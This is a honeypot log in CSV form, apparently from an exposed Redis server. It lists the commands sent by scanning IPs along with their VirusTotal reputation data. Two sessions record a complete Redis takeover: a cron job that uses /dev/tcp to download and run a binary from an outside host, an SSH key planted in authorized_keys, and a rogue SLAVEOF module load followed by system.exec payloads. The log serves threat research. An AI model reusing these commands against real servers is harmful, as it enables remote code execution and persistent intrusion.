time,action,Anon Src IP,src_port,level,VT Malicious,VT Engines,VT Labels,VT Reputation,Geo Location,ISP,Unnamed: 11,VT Tags,Malicious_Flag
3/13/2025 16:47,INFO,154.90.173.76,39354,info,1,SOCRadar,malicious,0,MK,AS215540 GLOBAL CONNECTIVITY SOLUTIONS LLP,,,0
3/13/2025 16:47,PING,154.90.173.76,39354,info,1,SOCRadar,malicious,0,MK,AS215540 GLOBAL CONNECTIVITY SOLUTIONS LLP,,,0
3/13/2025 16:47,Closed,154.90.173.76,39354,info,1,SOCRadar,malicious,0,MK,AS215540 GLOBAL CONNECTIVITY SOLUTIONS LLP,,,0
3/13/2025 16:47,NONEXISTENT,154.90.173.76,39354,info,1,SOCRadar,malicious,0,MK,AS215540 GLOBAL CONNECTIVITY SOLUTIONS LLP,,,0
3/13/2025 16:47,NewConnect,154.90.173.76,39354,info,1,SOCRadar,malicious,0,MK,AS215540 GLOBAL CONNECTIVITY SOLUTIONS LLP,,,0
3/13/2025 16:47,QUIT,154.90.173.76,39354,info,1,SOCRadar,malicious,0,MK,AS215540 GLOBAL CONNECTIVITY SOLUTIONS LLP,,,0
3/13/2025 16:47,Closed,154.90.173.76,39352,info,1,SOCRadar,malicious,0,MK,AS215540 GLOBAL CONNECTIVITY SOLUTIONS LLP,,,0
3/13/2025 18:32,"set x ""\n* * * * * if ! ps | grep -v grep | grep -q gcgJOdFRrE;then exec 6<>/dev/tcp/47.236.128.72/60149 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/gcgJOdFRrE ;fi && chmod +x /tmp/gcgJOdFRrE && /tmp/gcgJOdFRrE nKDBJGgdF9MBF2Q3N7g6vD8oYBoTzBIVdDvNtP/guMkkaBoaywMTZC4vuzayIShlGx3MFx90PsG65+GxzTh6GBfTARFiNz64OKQ4K24UA8wUFXo7z7D/47LXO2wdDs4LGGIpPrszqjwsehADyA4ebzvXseDmus86ax4U3QIUZDc9uC67OSh6EQvHFhxrO8qg5eauyzlsAhHPCwxjKzW8MLs7IHabPjPK2wYwtx6WYeKFHQ/teMI8hM0m95A5xxunor8=\n""",220.50.4.197,39486,info,0,,,0,BE,AS396982 Google LLC,,,0
3/13/2025 18:32,info server,220.50.4.197,39486,info,0,,,0,BE,AS396982 Google LLC,,,0
3/13/2025 18:32,FLUSHDB,220.50.4.197,39486,info,0,,,0,BE,AS396982 Google LLC,,,0
3/13/2025 18:32,save,220.50.4.197,39486,info,0,,,0,BE,AS396982 Google LLC,,,0
3/13/2025 18:32,config set dir .,220.50.4.197,39486,info,0,,,0,BE,AS396982 Google LLC,,,0
3/13/2025 18:32,config set dbfilename dump.rdb,220.50.4.197,39486,info,0,,,0,BE,AS396982 Google LLC,,,0
3/13/2025 18:32,config set rdbcompression yes,220.50.4.197,39486,info,0,,,0,BE,AS396982 Google LLC,,,0
3/13/2025 18:32,NewConnect,220.50.4.197,39486,info,0,,,0,BE,AS396982 Google LLC,,,0
3/13/2025 18:32,config set rdbcompression no,220.50.4.197,39486,info,0,,,0,BE,AS396982 Google LLC,,,0
3/13/2025 18:32,"set x ""\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZh7PuIw0sqnlzZcJAYWJ8/vx4q/yfW1T2JIOlA9vO5RsoqgzUFxZmu8Nx7hgzufSCQ3RcL3hovAhfTMsKGH77qTTyZRSkteM/pojQEl/33ock1QhuCjv0HrrkOFj55Ij9gjQv6JSZsXNY+34IS7xFs/2BdqjHzQmNTYubsZl81doL0nDbEr6UWoR8ASwIEUn57nciP0OivpVG07Z34uNbCvLZIm8bF1DYD1W/B18QrvKWsyATBkl8Wa/6zXurAMoJby3QH2OdttrLHban8xboh7WohEEn3+/jNuGGgKgpQbxCHUryZ5twTKYRwrTQkGqlWaZj8MugRq1L8md2akOb root@localhost.localdomain\n\n""",220.50.4.197,39486,info,0,,,0,BE,AS396982 Google LLC,,,0
3/13/2025 18:32,config set dir /root/.ssh/,220.50.4.197,39486,info,0,,,0,BE,AS396982 Google LLC,,,0
3/13/2025 18:32,config set dbfilename authorized_keys,220.50.4.197,39486,info,0,,,0,BE,AS396982 Google LLC,,,0
3/13/2025 18:32,SLAVEOF 47.236.128.72 60149,220.50.4.197,39486,info,0,,,0,BE,AS396982 Google LLC,,,0
3/13/2025 18:32,CONFIG SET dbfilename exp.so,220.50.4.197,39486,info,0,,,0,BE,AS396982 Google LLC,,,0
3/13/2025 18:32,CONFIG SET dir /tmp/,220.50.4.197,39486,info,0,,,0,BE,AS396982 Google LLC,,,0
3/13/2025 18:32,SLAVEOF NO ONE,220.50.4.197,39486,info,0,,,0,BE,AS396982 Google LLC,,,0
3/13/2025 18:32,MODULE LOAD /tmp/exp.so,220.50.4.197,39486,info,0,,,0,BE,AS396982 Google LLC,,,0
3/13/2025 18:32,"system.exec ""bash -c \""exec 6<>/dev/tcp/47.236.128.72/60149 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/gcgJOdFRrE && chmod +x /tmp/gcgJOdFRrE && /tmp/gcgJOdFRrE nKDBJGgdF9MBF2Q3N7g6vD8oYBoTzBIVdDvNtP/guMkkaBoaywMTZC4vuzayIShlGx3MFx90PsG65+GxzTh6GBfTARFiNz64OKQ4K24UA8wUFXo7z7D/47LXO2wdDs4LGGIpPrszqjwsehADyA4ebzvXseDmus86ax4U3QIUZDc9uC67OSh6EQvHFhxrO8qg5eauyzlsAhHPCwxjKzW8MLs7IHabPjPK2wYwtx6WYeKFHQ/teMI8hM0m95A5xxunor8=\""""",220.50.4.197,39486,info,0,,,0,BE,AS396982 Google LLC,,,0
3/13/2025 18:32,"system.exec ""rm -rf /tmp/exp.so""",220.50.4.197,39486,info,0,,,0,BE,AS396982 Google LLC,,,0
3/13/2025 18:32,MODULE UNLOAD system,220.50.4.197,39486,info,0,,,0,BE,AS396982 Google LLC,,,0
3/13/2025 18:32,Closed,220.50.4.197,39486,info,0,,,0,BE,AS396982 Google LLC,,,0
3/13/2025 19:37,NewConnect,123.179.72.64,56252,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
3/13/2025 19:37,NewConnect,123.179.72.64,56262,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
3/13/2025 19:37,PING,123.179.72.64,56262,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
3/13/2025 19:37,INFO,123.179.72.64,56262,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
3/13/2025 19:37,NONEXISTENT,123.179.72.64,56262,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
3/13/2025 19:37,QUIT,123.179.72.64,56262,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
3/13/2025 19:37,Closed,123.179.72.64,56262,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
3/13/2025 19:37,Closed,123.179.72.64,56252,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
3/13/2025 20:11,Closed,214.35.123.207,40136,info,0,,,0,US,AS8075 Microsoft Corporation,,,0
3/13/2025 20:11,NewConnect,214.35.123.207,40136,info,0,,,0,US,AS8075 Microsoft Corporation,,,0
3/13/2025 20:11,MGLNDD_3.15.22.167_6379,214.35.123.207,40136,info,0,,,0,US,AS8075 Microsoft Corporation,,,0
3/13/2025 20:20,NewConnect,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:20,info server,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:21,FLUSHDB,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:21,"set x ""\n* * * * * if ! ps | grep -v grep | grep -q umtEHCbyf2;then exec 6<>/dev/tcp/47.236.21.173/60145 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/umtEHCbyf2 ;fi && chmod +x /tmp/umtEHCbyf2 && /tmp/umtEHCbyf2 38ZHNLP377I3R8Dc2MtfNrH19KAyXt/Z2MZHMbHv8Lg8X8Ha28BJMrfv87QzR8DZ3d9cMLr38bE1WtHTxcNYP67w9bYoW8HS0cdZN7P34bcxR8jbxcRZKLjz+7Y2WMDay8BZNa7w8bEoWMTYxcNePLbx8LA2ALU+kvMFxHOUV0TrDA==\n""",208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:21,config set rdbcompression no,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:21,save,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:22,config set dir .,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:22,config set dbfilename dump.rdb,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:22,config set rdbcompression yes,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:23,FLUSHDB,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:23,"set x ""\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZh7PuIw0sqnlzZcJAYWJ8/vx4q/yfW1T2JIOlA9vO5RsoqgzUFxZmu8Nx7hgzufSCQ3RcL3hovAhfTMsKGH77qTTyZRSkteM/pojQEl/33ock1QhuCjv0HrrkOFj55Ij9gjQv6JSZsXNY+34IS7xFs/2BdqjHzQmNTYubsZl81doL0nDbEr6UWoR8ASwIEUn57nciP0OivpVG07Z34uNbCvLZIm8bF1DYD1W/B18QrvKWsyATBkl8Wa/6zXurAMoJby3QH2OdttrLHban8xboh7WohEEn3+/jNuGGgKgpQbxCHUryZ5twTKYRwrTQkGqlWaZj8MugRq1L8md2akOb root@localhost.localdomain\n\n""",208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:23,config set dir /root/.ssh/,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:24,config set dbfilename authorized_keys,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:24,config set rdbcompression no,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:24,save,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:24,config set dir .,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:24,config set dbfilename dump.rdb,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:24,config set rdbcompression yes,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:24,CONFIG SET dir /tmp/,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:24,CONFIG SET dbfilename exp.so,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:24,SLAVEOF 47.236.21.173 60145,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:24,MODULE LOAD /tmp/exp.so,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:25,MODULE LOAD /tmp/exp.so,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:25,SLAVEOF NO ONE,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:25,config set dir .,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:25,config set dbfilename dump.rdb,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:25,"system.exec ""rm -rf /tmp/exp.so""",208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:25,"system.exec ""bash -c \""exec 6<>/dev/tcp/47.236.21.173/60145 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/umtEHCbyf2 && chmod +x /tmp/umtEHCbyf2 && /tmp/umtEHCbyf2 38ZHNLP377I3R8Dc2MtfNrH19KAyXt/Z2MZHMbHv8Lg8X8Ha28BJMrfv87QzR8DZ3d9cMLr38bE1WtHTxcNYP67w9bYoW8HS0cdZN7P34bcxR8jbxcRZKLjz+7Y2WMDay8BZNa7w8bEoWMTYxcNePLbx8LA2ALU+kvMFxHOUV0TrDA==\""""",208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:25,MODULE UNLOAD system,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 20:25,Closed,208.50.128.241,33916,info,1,Criminal IP,malicious,-1,SG,"AS45102 Alibaba (US) Technology Co., Ltd.",,,0
3/13/2025 22:37,NewConnect,173.177.210.237,44548,info,0,,,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/13/2025 22:37,hello 3,173.177.210.237,44548,info,0,,,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/13/2025 22:37,ping,173.177.210.237,44548,info,0,,,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/13/2025 22:37,info server,173.177.210.237,44548,info,0,,,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/13/2025 22:37,Closed,173.177.210.237,44548,info,0,,,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/13/2025 23:10,hello 3,250.133.34.239,36700,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/13/2025 23:10,info server,250.133.34.239,36700,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/13/2025 23:10,NewConnect,250.133.34.239,36700,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/13/2025 23:10,ping,250.133.34.239,36700,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/13/2025 23:10,Closed,250.133.34.239,36700,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/14/2025 1:03,NewConnect,152.60.107.163,34125,info,5,"Criminal IP, CyRadar, Forcepoint ThreatSeeker, IPsum, SOCRadar","malicious, malware",0,FR,AS213412 ONYPHE SAS,,,0
3/14/2025 1:03,"����B;6��+�������'��,�3��Ӻ�� d !x� ��\e�1 �4 r�����-�])�,��3g�����9k�����E������ �#�����+�",152.60.107.163,34125,info,5,"Criminal IP, CyRadar, Forcepoint ThreatSeeker, IPsum, SOCRadar","malicious, malware",0,FR,AS213412 ONYPHE SAS,,,0
3/14/2025 1:03,Closed,152.60.107.163,34125,info,5,"Criminal IP, CyRadar, Forcepoint ThreatSeeker, IPsum, SOCRadar","malicious, malware",0,FR,AS213412 ONYPHE SAS,,,0
3/14/2025 1:03,NewConnect,152.60.107.252,58955,info,5,"Criminal IP, CyRadar, Forcepoint ThreatSeeker, IPsum, SOCRadar","malicious, malware",0,FR,AS213412 ONYPHE SAS,,,0
3/14/2025 1:03,GET / HTTP/1.1,152.60.107.252,58955,info,5,"Criminal IP, CyRadar, Forcepoint ThreatSeeker, IPsum, SOCRadar","malicious, malware",0,FR,AS213412 ONYPHE SAS,,,0
3/14/2025 1:03,Closed,152.60.107.252,58955,info,5,"Criminal IP, CyRadar, Forcepoint ThreatSeeker, IPsum, SOCRadar","malicious, malware",0,FR,AS213412 ONYPHE SAS,,,0
3/14/2025 1:14,NewConnect,234.134.60.24,44518,info,1,Guardpot,malicious,0,US,AS8075 Microsoft Corporation,,,0
3/14/2025 1:14,info,234.134.60.24,44518,info,1,Guardpot,malicious,0,US,AS8075 Microsoft Corporation,,,0
3/14/2025 1:14,Closed,234.134.60.24,44518,info,1,Guardpot,malicious,0,US,AS8075 Microsoft Corporation,,,0
3/14/2025 3:32,info,176.210.164.150,13335,info,0,,,0,CN,AS4134 CHINANET-BACKBONE,,,0
3/14/2025 3:32,help,176.210.164.150,13335,info,0,,,0,CN,AS4134 CHINANET-BACKBONE,,,0
3/14/2025 3:32,NewConnect,176.210.164.150,13335,info,0,,,0,CN,AS4134 CHINANET-BACKBONE,,,0
3/14/2025 3:32,Closed,176.210.164.150,13335,info,0,,,0,CN,AS4134 CHINANET-BACKBONE,,,0
3/14/2025 9:03,NewConnect,191.187.179.140,50155,info,1,SOCRadar,malware,0,CN,,,,0
3/14/2025 9:03,Closed,191.187.179.140,50155,info,1,SOCRadar,malware,0,CN,,,,0
3/14/2025 9:03,info,191.187.179.140,50155,info,1,SOCRadar,malware,0,CN,,,,0
3/14/2025 11:12,NONEXISTENT,106.54.105.54,57988,info,8,"Criminal IP, ArcSight Threat Intelligence, BitDefender, CINS Army, CyRadar, Fortinet, G-Data, SOCRadar","malicious, malware, phishing",-1,CA,AS16276 OVH SAS,,,0
3/14/2025 11:12,QUIT,106.54.105.54,57988,info,8,"Criminal IP, ArcSight Threat Intelligence, BitDefender, CINS Army, CyRadar, Fortinet, G-Data, SOCRadar","malicious, malware, phishing",-1,CA,AS16276 OVH SAS,,,0
3/14/2025 11:12,Closed,106.54.105.54,57978,info,8,"Criminal IP, ArcSight Threat Intelligence, BitDefender, CINS Army, CyRadar, Fortinet, G-Data, SOCRadar","malicious, malware, phishing",-1,CA,AS16276 OVH SAS,,,0
3/14/2025 11:12,Closed,106.54.105.54,57988,info,8,"Criminal IP, ArcSight Threat Intelligence, BitDefender, CINS Army, CyRadar, Fortinet, G-Data, SOCRadar","malicious, malware, phishing",-1,CA,AS16276 OVH SAS,,,0
3/14/2025 11:12,NewConnect,106.54.105.54,57988,info,8,"Criminal IP, ArcSight Threat Intelligence, BitDefender, CINS Army, CyRadar, Fortinet, G-Data, SOCRadar","malicious, malware, phishing",-1,CA,AS16276 OVH SAS,,,0
3/14/2025 11:12,NewConnect,106.54.105.54,57978,info,8,"Criminal IP, ArcSight Threat Intelligence, BitDefender, CINS Army, CyRadar, Fortinet, G-Data, SOCRadar","malicious, malware, phishing",-1,CA,AS16276 OVH SAS,,,0
3/14/2025 11:12,PING,106.54.105.54,57988,info,8,"Criminal IP, ArcSight Threat Intelligence, BitDefender, CINS Army, CyRadar, Fortinet, G-Data, SOCRadar","malicious, malware, phishing",-1,CA,AS16276 OVH SAS,,,0
3/14/2025 11:12,INFO,106.54.105.54,57988,info,8,"Criminal IP, ArcSight Threat Intelligence, BitDefender, CINS Army, CyRadar, Fortinet, G-Data, SOCRadar","malicious, malware, phishing",-1,CA,AS16276 OVH SAS,,,0
3/14/2025 15:06,NewConnect,180.155.203.140,44779,info,10,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Cyble, CyRadar, Fortinet, G-Data, Lionic, SOCRadar, VIPRE","malicious, malware, phishing",-3,US,AS14987 Rethem Hosting LLC,,,0
3/14/2025 18:06,NewConnect,188.129.239.87,49924,info,5,"ADMINUSLabs, BitDefender, CyRadar, G-Data, SOCRadar","malicious, phishing, malware",-1,CN,"AS137718 Beijing Volcano Engine Technology Co., Ltd.",,,0
3/14/2025 18:06,info,188.129.239.87,49924,info,5,"ADMINUSLabs, BitDefender, CyRadar, G-Data, SOCRadar","malicious, phishing, malware",-1,CN,"AS137718 Beijing Volcano Engine Technology Co., Ltd.",,,0
3/14/2025 18:06,Closed,188.129.239.87,49924,info,5,"ADMINUSLabs, BitDefender, CyRadar, G-Data, SOCRadar","malicious, phishing, malware",-1,CN,"AS137718 Beijing Volcano Engine Technology Co., Ltd.",,,0
3/14/2025 18:28,Closed,169.37.27.39,51946,info,8,"ADMINUSLabs, Certego, CINS Army, CyRadar, Fortinet, GreyNoise, Lionic, SOCRadar","malicious, phishing, malware",0,CN,AS4134 CHINANET-BACKBONE,,,0
3/14/2025 18:28,NewConnect,169.37.27.39,51946,info,8,"ADMINUSLabs, Certego, CINS Army, CyRadar, Fortinet, GreyNoise, Lionic, SOCRadar","malicious, phishing, malware",0,CN,AS4134 CHINANET-BACKBONE,,,0
3/14/2025 18:28,info,169.37.27.39,51946,info,8,"ADMINUSLabs, Certego, CINS Army, CyRadar, Fortinet, GreyNoise, Lionic, SOCRadar","malicious, phishing, malware",0,CN,AS4134 CHINANET-BACKBONE,,,0
3/14/2025 19:50,NewConnect,234.134.60.118,35682,info,3,"Criminal IP, GreyNoise, Guardpot",malicious,-2,US,AS8075 Microsoft Corporation,,,0
3/14/2025 19:50,Closed,234.134.60.118,35682,info,3,"Criminal IP, GreyNoise, Guardpot",malicious,-2,US,AS8075 Microsoft Corporation,,,0
3/15/2025 1:35,Closed,216.174.196.101,53418,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/15/2025 1:35,info,216.174.196.101,53418,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/15/2025 1:35,NewConnect,216.174.196.101,53418,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/15/2025 7:55,MGLNDD_3.15.22.167_6379,234.150.211.225,52064,info,1,ArcSight Threat Intelligence,malware,0,US,AS8075 Microsoft Corporation,,,0
3/15/2025 7:55,NewConnect,234.150.211.225,52064,info,1,ArcSight Threat Intelligence,malware,0,US,AS8075 Microsoft Corporation,,,0
3/15/2025 7:55,Closed,234.150.211.225,52064,info,1,ArcSight Threat Intelligence,malware,0,US,AS8075 Microsoft Corporation,,,0
3/15/2025 7:57,info,125.18.197.216,47554,info,1,SOCRadar,malware,0,JP,AS31898 Oracle Corporation,,,0
3/15/2025 7:57,NewConnect,125.18.197.216,47554,info,1,SOCRadar,malware,0,JP,AS31898 Oracle Corporation,,,0
3/15/2025 7:57,Closed,125.18.197.216,47554,info,1,SOCRadar,malware,0,JP,AS31898 Oracle Corporation,,,0
3/15/2025 14:53,NewConnect,68.185.216.62,61034,info,6,"Criminal IP, Cyble, CyRadar, Fortinet, IPsum, SOCRadar","malicious, malware",-66,US,AS6939 Hurricane Electric LLC,,,1
3/15/2025 14:53,Closed,68.185.216.62,61034,info,6,"Criminal IP, Cyble, CyRadar, Fortinet, IPsum, SOCRadar","malicious, malware",-66,US,AS6939 Hurricane Electric LLC,,,1
3/15/2025 14:53,INFO,68.185.216.62,61034,info,6,"Criminal IP, Cyble, CyRadar, Fortinet, IPsum, SOCRadar","malicious, malware",-66,US,AS6939 Hurricane Electric LLC,,,1
3/15/2025 17:49,NewConnect,150.208.185.155,60000,info,9,"Criminal IP, BitDefender, Certego, CINS Army, CyRadar, G-Data, IPsum, Lionic, SOCRadar","malicious, phishing, malware",-8,NL,AS202425 IP Volume inc,,,0
3/15/2025 17:49,"okRH�#�:N�ⴂ/� T���y�h���=""�� ��,��n�Y�bhl�(=':���oȢד����幐(�",150.208.185.155,60000,info,9,"Criminal IP, BitDefender, Certego, CINS Army, CyRadar, G-Data, IPsum, Lionic, SOCRadar","malicious, phishing, malware",-8,NL,AS202425 IP Volume inc,,,0
3/15/2025 17:50,Closed,150.208.185.155,60000,info,9,"Criminal IP, BitDefender, Certego, CINS Army, CyRadar, G-Data, IPsum, Lionic, SOCRadar","malicious, phishing, malware",-8,NL,AS202425 IP Volume inc,,,0
